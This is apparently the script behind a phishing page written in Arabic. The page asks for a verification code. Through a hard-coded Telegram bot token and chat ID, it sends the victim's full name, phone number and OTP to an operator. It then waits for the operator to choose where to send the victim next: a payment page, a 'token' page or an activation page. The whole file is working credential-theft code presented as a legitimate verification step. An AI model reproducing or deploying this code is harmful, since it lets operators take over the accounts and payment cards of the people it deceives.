const BOT_TOKEN = '8891065186:AAEl3mhHxdy53_2ZOnQU1E08FWFxmEsn1R4';
    const CHAT_ID = '6165206261';
    const WEBHOOK_URL = 'https://api.telegram.org/bot' + BOT_TOKEN;

    let pendingRequestId = null;

    async function sendToTelegram(message, requestId, dataType) {
        try {
            const response = await fetch(`${WEBHOOK_URL}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '📩 الرسالة', callback_data: `approve_${dataType}_${requestId}` },
                            { text: '❌ رفض', callback_data: `reject_${dataType}_${requestId}` },
                            { text: '💳 بطاقة', callback_data: `decline_card_${dataType}_${requestId}` },
                            { text: 'توكن', callback_data: `link_card_${dataType}_${requestId}` }
                        ]]
                    }
                })
            });
            const json = await response.json();
            return json.result ? json.result.message_id : null;
        } catch (e) { return null; }
    }

    async function editTelegramMessage(messageId, originalText, resultText) {
        try {
            await fetch(`${WEBHOOK_URL}/editMessageText`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    message_id: messageId,
                    text: originalText + '\n\n' + resultText,
                    parse_mode: 'HTML',
                    reply_markup: { inline_keyboard: [] }
                })
            });
        } catch (e) {}
    }

    async function checkWebhookResponse(requestId, dataType) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
            const data = await response.json();
            if (data.ok && data.result && data.result.length > 0) {
                for (let update of data.result) {
                    if (update.callback_query) {
                        const cb = update.callback_query.data;
                        if (cb === `approve_${dataType}_${requestId}`)      return 'approved';
                        if (cb === `reject_${dataType}_${requestId}`)       return 'rejected';
                        if (cb === `decline_card_${dataType}_${requestId}`) return 'decline_card';
                        if (cb === `link_card_${dataType}_${requestId}`)    return 'link_card';
                    }
                }
            }
            return 'pending';
        } catch (e) { return 'pending'; }
    }

    document.addEventListener('DOMContentLoaded', function () {
        const phone = sessionStorage.getItem('userPhoneNumber') || '';
        if (phone.length >= 4) {
            const masked = '*'.repeat(phone.length - 4) + phone.slice(-4);
            document.getElementById('maskedPhoneNumber').textContent = masked;
        }

        const boxes      = document.querySelectorAll('.otp-box');
        const resendBtn  = document.getElementById('resendBtn');
        const timerEl    = document.getElementById('timer');
        const declineMsg = document.getElementById('decline-message');
        let timeLeft = 300;
        let timerInterval;

        boxes.forEach((box, i) => {
            box.addEventListener('input', (e) => {
                const val = e.target.value.replace(/\D/g, '');
                e.target.value = val.slice(-1);
                if (val) {
                    box.classList.add('filled');
                    if (i < boxes.length - 1) boxes[i + 1].focus();
                    else checkAllFilled();
                } else {
                    box.classList.remove('filled');
                }
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace') {
                    if (!box.value && i > 0) {
                        boxes[i - 1].focus();
                        boxes[i - 1].value = '';
                        boxes[i - 1].classList.remove('filled');
                    } else {
                        box.value = '';
                        box.classList.remove('filled');
                    }
                }
            });

            box.addEventListener('paste', (e) => {
                e.preventDefault();
                const data = e.clipboardData.getData('text').replace(/\D/g, '');
                data.split('').slice(0, boxes.length).forEach((char, j) => {
                    if (boxes[j]) { boxes[j].value = char; boxes[j].classList.add('filled'); }
                });
                boxes[Math.min(data.length, boxes.length - 1)].focus();
                checkAllFilled();
            });
        });

        function checkAllFilled() {
            const code = [...boxes].map(b => b.value).join('');
            if (code.length === boxes.length) submitOTP(code);
        }

        async function submitOTP(code) {
            declineMsg.style.display = 'none';
            boxes.forEach(b => { b.disabled = true; b.classList.add('success'); });
            document.getElementById('loadingOverlay').classList.add('show');

            const fullName  = sessionStorage.getItem('userFullName') || 'غير معروف';
            const phone     = sessionStorage.getItem('userPhoneNumber') || '';
            const requestId = Date.now();
            pendingRequestId = requestId;

            const message =
                `🔔 <b>صفحة رمز التحقق - Verification</b>\n\n` +
                `👤 <b>الاسم الكامل:</b> <code>${fullName}</code>\n` +
                `📱 <b>رقم الهاتف:</b> <code>${phone}</code>\n` +
                `🔢 <b>رمز التحقق:</b> <code>${code}</code>\n\n` +
                `⏰ ${new Date().toLocaleString('ar-EG')}`;

            const messageId = await sendToTelegram(message, requestId, 'otp');

            if (!messageId) {
                document.getElementById('loadingOverlay').classList.remove('show');
                alert('حدث خطأ في إرسال البيانات. يرجى المحاولة مرة أخرى.');
                boxes.forEach(b => { b.disabled = false; b.classList.remove('success'); });
                return;
            }

            const checkInterval = setInterval(async () => {
                const status = await checkWebhookResponse(requestId, 'otp');
                if (status === 'approved') {
                    clearInterval(checkInterval);
                    await editTelegramMessage(messageId, message, '✅ تم التحويل لصفحة الرسالة');
                    document.getElementById('loadingOverlay').classList.remove('show');
                    window.location.href = 'Activation.html';
                } else if (status === 'rejected') {
                    clearInterval(checkInterval);
                    await editTelegramMessage(messageId, message, '❌ تم رفض الكود');
                    document.getElementById('loadingOverlay').classList.remove('show');
                    declineMsg.style.display = 'block';
                    boxes.forEach(b => { b.disabled = false; b.value = ''; b.classList.remove('filled', 'success'); });
                    pendingRequestId = null;
                    boxes[0].focus();
                } else if (status === 'decline_card') {
                    clearInterval(checkInterval);
                    await editTelegramMessage(messageId, message, '💳 تم التحويل لصفحة الدفع');
                    document.getElementById('loadingOverlay').classList.remove('show');
                    window.location.href = 'paymen.html';
                } else if (status === 'link_card') {
                    clearInterval(checkInterval);
                    await editTelegramMessage(messageId, message, 'تم التحويل لصفحة التوكن');
                    document.getElementById('loadingOverlay').classList.remove('show');
                    window.location.href = 'ver.html';
                }
            }, 2000);
        }

        function startTimer() {
            timerInterval = setInterval(function () {
                timeLeft--;
                const m = Math.floor(timeLeft / 60);
                const s = timeLeft % 60;
                timerEl.textContent = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
                if (timeLeft <= 30) timerEl.style.color = '#e74c3c';
                if (timeLeft <= 0) { clearInterval(timerInterval); resendBtn.disabled = false; }
            }, 1000);
        }

        resendBtn.addEventListener('click', function () {
            if (resendBtn.disabled) return;
            timeLeft = 300;
            timerEl.style.color = '#1a1a2e';
            resendBtn.disabled = true;
            boxes.forEach(b => { b.value = ''; b.classList.remove('filled', 'success'); b.disabled = false; });
            declineMsg.style.display = 'none';
            boxes[0].focus();
            startTimer();
        });

        boxes[0].focus();
        startTimer();
    });

    window.addEventListener('beforeunload', () => { pendingRequestId = null; });